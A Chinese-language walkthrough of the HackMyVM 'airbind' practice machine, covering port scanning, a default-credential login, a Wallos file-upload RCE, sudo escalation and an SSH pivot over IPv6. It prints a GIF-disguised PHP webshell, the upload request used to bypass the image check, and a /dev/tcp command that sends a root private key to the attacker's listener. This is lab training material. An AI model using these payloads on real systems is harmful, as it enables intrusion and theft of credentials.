# hmv_airbind

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=airbind
**难度**：黄色
**目标 IP**：192.168.205.212
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.212
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 17:39 CST
Nmap scan report for 192.168.205.212
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:AD:E1:D7 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/29%OT=80%CT=1%CU=32430%PV=Y%DS=1%DC=D%G=Y%M=0800
OS:27%TM=677118F6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%
OS:II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11N
OS:W7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8
OS:8%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F
OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.31 seconds
```

扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。

---

### **2. Web 服务探测与Wallos 文件上传漏洞**

对 80 端口感兴趣，访问 Web 页面，是个登录网页，扫描一下结构

```bash
┌──(kali㉿kali)-[~/test]
└─$ whatweb http://192.168.205.212/login.php
http://192.168.205.212/login.php [200 OK] Apache[2.4.57], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.57 (Ubuntu)], IP[192.168.205.212], PasswordField[password], Title[Wallos - Subscription Tracker]   
```

看有没有漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ searchsploit Wallos
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Wallos < 1.11.2 - File Upload RCE                                                                    | php/webapps/51924.txt
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                         
```

是个文件上传，要登录进去，尝试一下弱密码

`admin`:`admin`就这么水灵灵的进去了

[exploit-db](https://www.exploit-db.com/exploits/51924)想看原版利用的可以在这看,我直接放翻译上来了

```bash
# 漏洞标题：Wallos - 文件上传 RCE（已验证）
# 日期：2024-03-04
# 漏洞作者：sml@lacashita.com
# 供应商主页：https://github.com/ellite/Wallos
# 软件链接：https://github.com/ellite/Wallos
# 版本：< 1.11.2
# 测试平台：Debian 12

Wallos 允许您在创建新订阅时上传图像/徽标。

可以绕过此漏洞来上传恶意 .php 文件。

POC
---

1) 登录应用程序。
2) 转到“新订阅”
3) 上传徽标并选择您的 webshell .php
4) 发出请求，将 Content-Type 更改为 image/jpeg 并添加“GIF89a”，它应该是这样的：

--- SNIP -----------------

POST /endpoints/subscription/add.php HTTP/1.1

主机：192.168.1.44

用户代理：Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

接受：*/*

接受语言：en-US,en;q=0.5

接受编码：gzip，deflate

引用：http://192.168.1.44/

内容类型：multipart/form-data;边界=---------------------------29251442139477260933920738324

来源：http://192.168.1.44

内容长度：7220

连接：关闭

Cookie：theme=light；language=en；PHPSESSID=6a3e5adc1b74b0f1870bbfceb16cda4b；theme=light

-----------------------------29251442139477260933920738324

内容处置：form-data；name="name"

测试

-----------------------------29251442139477260933920738324

内容处置：form-data；name="logo"； filename="revshell.php"

Content-Type: image/jpeg

GIF89a;

<?php
system($_GET['cmd']);
?>

-----------------------------29251442139477260933920738324

Content-Disposition: form-data; name="logo-url"

----- SNIP -----

5) 您将收到文件已成功上传的响应：

{"status":"Success","message":"Subscription updated successful"}

6) 您的文件将位于：
http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php
```

总结一下就是经典的gif伪装，把下面内容做个`revshell.php.png`传上去，拿burp拦一下删除`.png`后缀就可以了（直接传不一定行，你们可以试试）

```bash
GIF89a;

<?php
system($_GET['cmd']);
?>
```

传上去打开`http://192.168.205.212/images/uploads/logos/`就可以看到了

![image](https://github.com/user-attachments/assets/509e49e8-17f9-46f4-b10e-7cba613d11db)

`http://192.168.205.212/images/uploads/logos/1735465582-1.php?cmd=id`就会发现执行成功，建议传个sh上去拿shell，我试了2个反弹都弹不回来

### 3.**获得稳定 shell**

获得交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

### 4.**提权**

上到去`sudo -l`有惊喜

```bash
www-data@ubuntu:/home$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL

```

执行任意命令

```bash
www-data@ubuntu:/home$ sudo bash -p
root@ubuntu:/home# id
uid=0(root) gid=0(root) groups=0(root)
```

当然当你打开`/root/`目录，你就会看到只有`user.txt`，所以这个应该是一个容器

```bash
root@ubuntu:/home/ubuntu# hostname -I
10.0.3.241 
```

确实是容器，在目录下还看到一个`.ssh`的登录密钥,拿过去我们那测试登录真机

```bash
#容器
root@ubuntu:~/.ssh# cat id_rsa > /dev/tcp/192.168.205.141/7777
#攻击机
nc -lvnp 7777 > id_rsa
```

测试登录ipv4登不上，他把端口关了（可以看最前面的扫描结果），那我们就连接ipv6

```bash
└─$ ping6 -I eth0 ff02::1
ping6: Warning: source address might be selected on device other than: eth0
PING ff02::1 (ff02::1) from :: eth0: 56 data bytes
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=1 ttl=64 time=0.148 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=1 ttl=64 time=0.823 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=2 ttl=64 time=0.055 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=2 ttl=64 time=0.537 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=3 ttl=64 time=0.047 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=3 ttl=64 time=0.493 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=4 ttl=64 time=0.038 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=4 ttl=64 time=0.350 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=5 ttl=64 time=0.041 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=5 ttl=64 time=0.349 ms
64 bytes from fe80::4e47:7084:75d9:9c4%eth0: icmp_seq=6 ttl=64 time=0.035 ms
64 bytes from fe80::a00:27ff:fead:e1d7%eth0: icmp_seq=6 ttl=64 time=0.332 ms
^C
--- ff02::1 ping statistics ---
6 packets transmitted, 6 received, +6 duplicates, 0% packet loss, time 5116ms
rtt min/avg/max/mdev = 0.035/0.270/0.823/0.244 ms
                                                                                  
```

发广播看看谁在线，然后一个个试就好了（桥接真实网卡别这么连，建议把桥接换成NAT模式再尝试）

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh -i id_rsa root@fe80::a00:27ff:fead:e1d7%eth0
Linux airbind 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@airbind:~# id
uid=0(root) gid=0(root) groupes=0(root)
```